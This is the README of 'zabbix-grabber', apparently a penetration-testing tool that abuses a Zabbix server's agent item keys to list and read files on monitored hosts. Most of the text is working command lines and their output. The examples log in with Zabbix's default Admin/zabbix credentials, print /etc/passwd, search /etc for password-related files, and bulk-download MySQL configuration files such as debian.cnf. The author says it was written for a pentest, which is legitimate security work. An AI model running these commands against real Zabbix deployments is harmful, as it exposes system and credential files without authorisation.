
# zabbix-grabber

A tool to retrieve files and folders information from a Zabbix installation without using API.
It has been tested with versions 6.4.x and 7.0.x.

## Background

I wrote this tool during a pentesting project just to retrieve folder information and text files content from machines that had installed Zabbix agent, through Zabbix Server.
Zabbix has the abbility to create items for each agent using several keys. I have taken advantage of the following:
* **vfs.dir.get** -> Return contents of a folder with several levels of depth, and filtering results using regular expressions.
* **vfs.file.contents** -> Return file content. This item has limitations of size and it only works with text files. It cannot retrieve the content of a binary file.

## Help
```
$ python3 zabbix-grabber.py --help
usage: zabbix-grabber.py [-h] -A BASE_URL [-U USER] [-P PASSWORD] [-H HOST_ID] [-F BASE_PATH] [-D DUMP_FILE] [-G] [-L RECURSIVE_LEVELS] [-R REGEX] [--only-up] [--plain-structure]

Grab information from file system of Zabbix agents connected to a Zabbix server.

options:
  -h, --help            show this help message and exit
  -A BASE_URL, --base-url BASE_URL
                        Zabbix base URL (don't use /index.php).
  -U USER, --user USER  Username to connect to Zabbix.
  -P PASSWORD, --password PASSWORD
                        Password to connect to Zabbix.
  -H HOST_ID, --host-id HOST_ID
                        Host ID used to list folder contents.
  -F BASE_PATH, --base-path BASE_PATH
                        Base folder from which we're goin to read contents.
  -D DUMP_FILE, --dump-file DUMP_FILE
                        File name to be dumped. This requires -F option.
  -G, --store-file      Store file localy into ZGFiles structure.
  -L RECURSIVE_LEVELS, --recursive-levels RECURSIVE_LEVELS
                        Levels of recursivity (default=0, max=5).
  -R REGEX, --regex REGEX
                        Regular expression to find files into folders.
  --only-up             Display only online and available agents.
  --plain-structure     Used to download files in current folder. The scrip will not try to create ZGFiles/{HOST_ID} folder structure.

Examples of usage:

  1. List hosts from Zabbix server:
     python3 zabbix-grabber.py -U username -P password -A http://server/zabbix 

  2. List folder contents (by default it doesn't use recursivity):
     python3 zabbix-grabber.py -U username -P password -A http://server/zabbix -H HOST_ID -F folder_path

  3. Display file content (it must be plain text file):
     python3 zabbix-grabber.py -U username -P password -A http://server/zabbix -H HOST_ID -F folder_path -D file_name

```

## Usage

The tool should be used combining the different options in different steps:
1. **Retrieve Zabbix agents list**: you can use `-A http://server-address/zabbix` combined with `-U user -P password`.
If you don't specify the credentials, the script will use default credentials for Zabbix server (Admin/zabbix).
You can use `--only-up` to display only hosts that are currently up.
Example:
```
$ python3 zabbix-grabber.py -A http://server-address/zabbix
  ______     _     _     _         _____           _     _               
 |___  /    | |   | |   (_)       / ____|         | |   | |                                                                                                                                                                                  
    / / __ _| |__ | |__  ___  __ | |  __ _ __ __ _| |__ | |__   ___ _ __                                                                                                                                                                     
   / / / _` | '_ \| '_ \| \ \/ / | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|                                                                                                                                                                    
  / /_| (_| | |_) | |_) | |>  <  | |__| | | | (_| | |_) | |_) |  __/ |                                                                                                                                                                       
 /_____\__,_|_.__/|_.__/|_/_/\_\  \_____|_|  \__,_|_.__/|_.__/ \___|_|      

By: rM3ofM3

Connecting to http://server-address/zabbix using Admin:zabbix.
[Successful logon to Zabbix version 6.4.]

Zabbix agents list:
- Host-ID: 10632, Host-name: Server2, Status: Up
- Host-ID: 10631, Host-name: Workstation1, Status: Down
- Host-ID: 10084, Host-name: Zabbix server, Status: Up
```
2. **List host folder content**: once you get the host-up from the agents connected to Zabbix server, you can retrieve the content of a folder for each server which status is up.
You shoud user `-H host-id-number` in combination with `-F "/folder-path"` to retrieve the contents of the folder.
Example:
```
$ python3 zabbix-grabber.py -A http://server-address/zabbix -H 10084 -F "/"                
  ______     _     _     _         _____           _     _               
 |___  /    | |   | |   (_)       / ____|         | |   | |                                                                                                                                                                                  
    / / __ _| |__ | |__  ___  __ | |  __ _ __ __ _| |__ | |__   ___ _ __                                                                                                                                                                     
   / / / _` | '_ \| '_ \| \ \/ / | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|                                                                                                                                                                    
  / /_| (_| | |_) | |_) | |>  <  | |__| | | | (_| | |_) | |_) |  __/ |                                                                                                                                                                       
 /_____\__,_|_.__/|_.__/|_/_/\_\  \_____|_|  \__,_|_.__/|_.__/ \___|_|      

By: rM3ofM3

Connecting to http://server-address/zabbix using Admin:zabbix.
[Successful logon to Zabbix version 6.4.]

Contents in '/' using 0 levels of recursivity:

Regular expression filter: ''

2024-12-06 14:17   <DIR> bin.usr-is-merged
2024-12-15 12:58   <DIR> boot
2024-12-06 14:17   <DIR> cdrom
2024-12-19 20:49   <DIR> dev
2024-12-15 15:55   <DIR> etc
2024-12-07 08:58   <DIR> home
2024-12-06 14:17   <DIR> lib.usr-is-merged
2024-12-06 14:16   <DIR> lost+found
2024-12-06 14:17   <DIR> media
2024-12-06 14:17   <DIR> mnt
2024-12-06 14:17   <DIR> opt
2024-12-19 20:49   <DIR> proc
2024-12-10 17:48   <DIR> root
2024-12-19 20:50   <DIR> run
2024-12-06 14:17   <DIR> sbin.usr-is-merged
2024-12-07 08:58   <DIR> snap
2024-12-06 14:17   <DIR> srv
2024-12-19 20:49   <DIR> sys
2024-12-19 21:09   <DIR> tmp
2024-12-06 14:17   <DIR> usr
2024-12-07 09:08   <DIR> var
2024-12-06 14:17         bin  (7.00 B)
2024-12-06 14:17         lib  (7.00 B)
2024-12-06 14:17         lib64  (9.00 B)
2024-12-06 14:17         sbin  (8.00 B)
```
3. **List host folder using recursivity and regex expression**: you can use `-L RECURSIVE_LEVELS` and `-R REGEX` to find specific file or folder names into a folder and their subfolders with RECURSIVE_LEVELS of depth.
By default, RECURSIVE_LEVES is 0, and it can be a number between 0 and 5. I don't recommend to try with smaller numbers to avoid a timeout response from the server.
When you use recursivity, the format of the output changes and it show full path of each file.
Example:
```
$ python3 zabbix-grabber.py -A http://server-address/zabbix -H 10084 -F "/etc" -L 2 -R "pass"
  ______     _     _     _         _____           _     _               
 |___  /    | |   | |   (_)       / ____|         | |   | |                                                                                                                                                                                  
    / / __ _| |__ | |__  ___  __ | |  __ _ __ __ _| |__ | |__   ___ _ __                                                                                                                                                                     
   / / / _` | '_ \| '_ \| \ \/ / | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|                                                                                                                                                                    
  / /_| (_| | |_) | |_) | |>  <  | |__| | | | (_| | |_) | |_) |  __/ |                                                                                                                                                                       
 /_____\__,_|_.__/|_.__/|_/_/\_\  \_____|_|  \__,_|_.__/|_.__/ \___|_|                                                                                                                                                                       

By: rM3ofM3

Connecting to http://server-address/zabbix using Admin:zabbix.
[Successful logon to Zabbix version 6.4.]

Contents in '/etc' using 2 levels of recursivity:

Regular expression filter: 'pass'

2024-12-07 09:08  /etc/passwd-  (1.88 KB)
2024-12-07 09:08  /etc/passwd  (1.90 KB)
2024-12-06 14:17  /etc/apparmor.d/1password  (354.00 B)
2024-12-06 14:17  /etc/apparmor.d/MongoDB_Compass  (386.00 B)
2024-12-06 14:17  /etc/apparmor.d/abstractions/smbpass  (581.00 B)
2024-12-06 14:17  /etc/security/opasswd  (0 B)
2024-12-06 14:17  /etc/pam.d/common-password  (1.58 KB)
2024-12-06 14:17  /etc/pam.d/chpasswd  (92.00 B)
2024-12-06 14:17  /etc/pam.d/passwd  (92.00 B)
2024-12-07 09:06  /etc/apache2/mods-available/proxy_fdpass.load  (93.00 B)
2024-12-06 14:17  /etc/ssl/certs/Buypass_Class_2_Root_CA.pem  (62.00 B)
2024-12-06 14:17  /etc/ssl/certs/Buypass_Class_3_Root_CA.pem  (62.00 B)
```
4. **Retrieve the contents of a file**: using `-D "filename"` in combination with `-F "foldername"`.
If you use `-G` in addition, the file will be downloaded instead of displaying it in the default output. When you use `-G` option, zabbix-grabber will create a folder called `ZGfiles` that will contain an structure of the files retrieved for each host ID. It will creat subfolders with the host ID number, and the structure of folders that contain the files you download. If you don't want that zabbix-grabber stores the files creating this structure and leave the files in the current execution folder path, you can use `--plain-structure`.
Example:
```
$ python3 zabbix-grabber.py -A http://192.168.0.33/zabbix -H 10084 -F "/etc" -D "passwd"
  ______     _     _     _         _____           _     _               
 |___  /    | |   | |   (_)       / ____|         | |   | |                                                                                                                                                                                  
    / / __ _| |__ | |__  ___  __ | |  __ _ __ __ _| |__ | |__   ___ _ __                                                                                                                                                                     
   / / / _` | '_ \| '_ \| \ \/ / | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|                                                                                                                                                                    
  / /_| (_| | |_) | |_) | |>  <  | |__| | | | (_| | |_) | |_) |  __/ |                                                                                                                                                                       
 /_____\__,_|_.__/|_.__/|_/_/\_\  \_____|_|  \__,_|_.__/|_.__/ \___|_|                                                                                                                                                                       

By: rM3ofM3

Connecting to http://192.168.0.33/zabbix using Admin:zabbix.
[Successful logon to Zabbix version 6.4.]

Content for file '/etc/passwd':

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```
Combined with `-G`
```
$ python3 zabbix-grabber.py -A http://192.168.0.33/zabbix -H 10084 -F "/etc" -D "passwd" -G
  ______     _     _     _         _____           _     _               
 |___  /    | |   | |   (_)       / ____|         | |   | |                                                                                                                                                                                  
    / / __ _| |__ | |__  ___  __ | |  __ _ __ __ _| |__ | |__   ___ _ __                                                                                                                                                                     
   / / / _` | '_ \| '_ \| \ \/ / | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|                                                                                                                                                                    
  / /_| (_| | |_) | |_) | |>  <  | |__| | | | (_| | |_) | |_) |  __/ |                                                                                                                                                                       
 /_____\__,_|_.__/|_.__/|_/_/\_\  \_____|_|  \__,_|_.__/|_.__/ \___|_|                                                                                                                                                                       

By: rM3ofM3

Connecting to http://192.168.0.33/zabbix using Admin:zabbix.
[Successful logon to Zabbix version 6.4.]

File '/etc/passwd' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/passwd'.
```
5. **Retrieve a collection of files**: using `-F "foldername"` in combination with `-G`. In this case, if you don't specify `-D` option, the tool will retrieve all files in a folder.
When you combine it with `-R REGEX` and `-L RECURSIVE_LEVELS` you will be able to download files from folders and subfolders.
Example:
```
$ python3 zabbix-grabber.py -A http://192.168.0.33/zabbix -H 10084 -F "/etc/mysql" -L 2 -G
  ______     _     _     _         _____           _     _               
 |___  /    | |   | |   (_)       / ____|         | |   | |                                                                                                                                                                                  
    / / __ _| |__ | |__  ___  __ | |  __ _ __ __ _| |__ | |__   ___ _ __                                                                                                                                                                     
   / / / _` | '_ \| '_ \| \ \/ / | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|                                                                                                                                                                    
  / /_| (_| | |_) | |_) | |>  <  | |__| | | | (_| | |_) | |_) |  __/ |                                                                                                                                                                       
 /_____\__,_|_.__/|_.__/|_/_/\_\  \_____|_|  \__,_|_.__/|_.__/ \___|_|                                                                                                                                                                       

By: rM3ofM3

Connecting to http://192.168.0.33/zabbix using Admin:zabbix.
[Successful logon to Zabbix version 6.4.]

Contents in '/etc/mysql' using 2 levels of recursivity:

Regular expression filter: ''

2024-12-07 09:09  /etc/mysql/mysql.cnf  (682.00 B)
2024-12-07 09:09  /etc/mysql/debian-start  (120.00 B)
2024-12-07 09:08  /etc/mysql/my.cnf.fallback  (839.00 B)
2024-12-07 09:09  /etc/mysql/debian.cnf  (317.00 B)
2024-12-07 09:08  /etc/mysql/my.cnf  (24.00 B)
2024-12-07 09:08  /etc/mysql/conf.d/mysql.cnf  (8.00 B)
2024-12-07 09:08  /etc/mysql/conf.d/mysqldump.cnf  (55.00 B)
2024-12-07 09:09  /etc/mysql/mysql.conf.d/mysqld.cnf  (2.17 KB)
2024-12-07 09:09  /etc/mysql/mysql.conf.d/mysql.cnf  (132.00 B)

Are you sure you want to download all those files (Y/N): y
File '/etc/mysql/mysql.cnf' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/mysql.cnf'.
File '/etc/mysql/debian-start' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/debian-start'.
File '/etc/mysql/my.cnf.fallback' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/my.cnf.fallback'.
Error processing server reply message.
Server response: {"steps":[],"user":{"debug_mode":false},"error":{"messages":["Cannot open file: [13] Permission denied"]}}
Exception: 'dict' object has no attribute 'text'
File '/etc/mysql/my.cnf' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/my.cnf'.
File '/etc/mysql/conf.d/mysql.cnf' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/conf.d/mysql.cnf'.
File '/etc/mysql/conf.d/mysqldump.cnf' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/conf.d/mysqldump.cnf'.
File '/etc/mysql/mysql.conf.d/mysqld.cnf' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/mysql.conf.d/mysqld.cnf'.
File '/etc/mysql/mysql.conf.d/mysql.cnf' downloaded into '/root/ZABBIX/ZGFiles/10084/etc/mysql/mysql.conf.d/mysql.cnf'.

```
I hope you enyoy using this tool and I hope you find it useful.
